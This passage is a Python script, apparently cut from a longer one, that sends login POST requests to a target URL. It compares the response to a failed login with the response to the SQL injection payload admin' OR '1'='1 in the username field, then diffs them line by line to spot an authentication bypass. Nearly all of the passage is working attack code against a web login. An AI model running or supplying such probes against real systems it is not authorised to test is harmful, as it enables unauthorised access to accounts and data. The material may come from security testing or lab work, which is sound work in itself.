resp_fail = requests.post(url, data={'username': 'notauser123', 'password': 'wrongpass'})
print(f"Length: {len(resp_fail.text)}")
print(f"Full Response:\n{resp_fail.text}")
print("\n" + "="*80 + "\n")

# 2. Failed login with wrong password for admin
print("--- [2] Failed Login (admin user, wrong password) ---")
resp_admin_wrong = requests.post(url, data={'username': 'admin', 'password': 'wrongpass'})
print(f"Length: {len(resp_admin_wrong.text)}")
print(f"Full Response:\n{resp_admin_wrong.text}")
print("\n" + "="*80 + "\n")

# 3. SQLi payload
print("--- [3] SQLi Payload (admin' OR '1'='1) ---")
resp_sqli = requests.post(url, data={'username': "admin' OR '1'='1", 'password': 'anything'})
print(f"Length: {len(resp_sqli.text)}")
print(f"Full Response:\n{resp_sqli.text}")

# Compare line by line
print("\n=== Line-by-line Comparison ===\n")
lines_fail = resp_fail.text.split('\n')
lines_sqli = resp_sqli.text.split('\n')

print(f"Failed login lines: {len(lines_fail)}")
print(f"SQLi payload lines: {len(lines_sqli)}")

for i, (l1, l2) in enumerate(zip(lines_fail, lines_sqli)):
    if l1 != l2:
        print(f"[DIFF at line {i+1}]")
        print(f"  Fail: {l1[:100]}")
        print(f"  SQLi: {l2[:100]}")

